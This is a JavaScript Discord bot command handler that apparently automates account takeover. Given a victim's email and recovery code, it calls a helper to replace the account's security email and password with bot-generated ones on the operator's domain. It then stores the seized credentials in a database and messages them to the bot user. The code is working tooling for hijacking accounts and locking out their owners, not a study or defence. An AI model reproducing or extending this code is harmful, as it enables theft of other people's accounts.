const { ButtonBuilder, ButtonStyle, ActionRowBuilder, EmbedBuilder } = require('discord.js');
const recoveryCodeSecure = require("../../utils/secure/recoveryCodeSecure.js");
const { domains } = require("../../../config.json");
const generate = require("../../utils/generate.js");
const { queryParams } = require("../../../db/database.js");
const validEmail = require("../../utils/emails/validEmail.js");

module.exports = {
    name: "ownsecure",
    userOnly: true,
    callback: async (client, interaction) => {
        try {
            await interaction.deferReply({ ephemeral: true });

            let settings = await queryParams(
                `SELECT * FROM secureconfig WHERE user_id=?`,
                [interaction.user.id]
            );

            if (settings.length === 0) {
                return interaction.editReply({
                    content: `Couldn't get your settings!`,
                    ephemeral: true,
                });
            }

            settings = settings[0];

            const email = interaction.components[0].components[0].value.trim();
            const recoveryCode = interaction.components[1].components[0].value.trim();
            const secEmailInput = interaction.components[2]?.components?.[0]?.value?.trim();

            const rawPrefix = require("../../../config.json").prefix || "vinGr0up";
            const prefix = String(rawPrefix).toLowerCase();
            const secEmail = secEmailInput && validEmail(secEmailInput)
                ? secEmailInput.toLowerCase()
                : `${prefix}${generate(10).toLowerCase()}@${(settings?.domain ? settings.domain : domains[0]).toLowerCase()}`;

            const password = interaction.components[3]?.components?.[0]?.value?.trim() || generate(16);

            const initialEmbed = new EmbedBuilder()
                .setTitle("🔒 Securing to Your Custom Email...")
                .setDescription(`**Target:** \`${email}\`\n**New Sec Email:** \`${secEmail}\`\n\n⚙️ Attaching security info via recovery code...`)
                .setColor(0x5865F2);

            await interaction.editReply({ embeds: [initialEmbed] });

            const data = await recoveryCodeSecure(email, recoveryCode, secEmail, password);

            if (data === null) {
                return interaction.editReply({ content: `Invalid email address!`, embeds: [], ephemeral: true });
            }
            if (data === 'tfa') {
                return interaction.editReply({ content: `Cannot secure when 2FA is enabled!`, embeds: [], ephemeral: true });
            }
            if (data === 'invalid') {
                return interaction.editReply({ content: `Invalid Recovery Code!`, embeds: [], ephemeral: true });
            }
            if (data === 'same') {
                return interaction.editReply({ content: `Cannot secure with old security email and/or password!`, embeds: [], ephemeral: true });
            }

            if (data?.email2 && data?.recoveryCode && data?.secEmail && data?.password) {
                const recsecId = generate(32);
                await queryParams(
                    `INSERT INTO actions(id, action) VALUES(?, ?)`,
                    [`${recsecId}`, `recsecure|${interaction.user.id}|${data.email2}|${data.secEmail}|${data.password}|${data.recoveryCode}`]
                );

                const msg = {
                    embeds: [
                        new EmbedBuilder()
                            .setTitle(`✅ Successfully Secured to Your Email!`)
                            .setDescription("Account has been updated with your security email and password:")
                            .addFields(
                                { name: "Email", value: "```\n" + data.email2 + "\n```", inline: true },
                                { name: "Security Email", value: "```\n" + data.secEmail + "\n```", inline: true },
                                { name: "Password", value: "```\n" + data.password + "\n```", inline: false },
                                { name: "Recovery Code", value: "```\n" + data.recoveryCode + "\n```", inline: false }
                            )
                            .setColor(0x2ecc71)
                    ],
                    components: [
                        new ActionRowBuilder().addComponents(
                            new ButtonBuilder()
                                .setCustomId(`copyrec|${recsecId}`)
                                .setLabel('📋 Copy Text')
                                .setStyle(ButtonStyle.Secondary)
                        )
                    ],
                    ephemeral: true
                };

                await interaction.user.send(msg).catch(() => {});
                return interaction.editReply(msg);
            }

            return interaction.editReply({
                content: `Failed to secure due to invalid data format. Please report this to an admin!`,
                embeds: [],
                ephemeral: true
            });

        } catch (error) {
            console.error(`Error in ownsecure callback: ${error}`);
            if (interaction.deferred || interaction.replied) {
                return interaction.editReply({
                    content: `An unexpected error occurred: ${error.message || error}`,
                    embeds: [],
                    components: [],
                    ephemeral: true
                }).catch(() => {});
            }
        }
    },
};
